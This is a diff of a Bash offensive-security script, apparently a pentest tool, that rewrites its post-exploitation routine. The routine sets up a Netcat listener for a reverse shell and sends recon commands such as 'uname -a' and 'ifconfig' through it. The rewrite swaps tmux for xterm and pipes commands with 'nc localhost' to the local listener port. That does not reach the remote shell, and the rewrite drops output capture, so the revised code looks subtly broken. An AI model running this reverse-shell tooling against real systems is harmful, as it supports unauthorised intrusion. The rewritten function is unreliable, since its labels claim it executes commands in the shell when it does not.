@@ -1865,8 +1865,8 @@ post_exploitation() {
     read -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
 
-    # Create a new tmux session for the Netcat listener
-    tmux new-session -d -s nc_listener "nc -lvnp $listen_port"
+    # Open a new terminal for the Netcat listener
+    xterm -hold -e "nc -lvnp $listen_port" &
 
     echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
     while true; do
@@ -1876,26 +1876,19 @@ post_exploitation() {
         read -p "Select an option: " post_option
 
         case $post_option in
-            1) send_command "uname -a && lsb_release -a" ;;
-            2) send_command "ifconfig || ip a" ;;
+            1) execute_command "uname -a && lsb_release -a" ;;
+            2) execute_command "ifconfig || ip a" ;;
             3) break ;;
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
-
-        # Display the output from the reverse shell
-        tmux capture-pane -pt nc_listener -S -1000
-        tmux show-buffer
-        tmux delete-buffer
     done
-
-    # Kill the tmux session after post-exploitation tasks are done
-    tmux kill-session -t nc_listener
 }
 
-# Function to send command to the reverse shell
-send_command() {
+# Function to execute command in the reverse shell
+execute_command() {
     local cmd="$1"
-    tmux send-keys -t nc_listener "$cmd" C-m
+    echo -e "${BLUE}[+] Executing: $cmd${NC}"
+    xterm -hold -e "echo '$cmd' | nc localhost $listen_port" &
 }
 
 check_install_dependencies() {
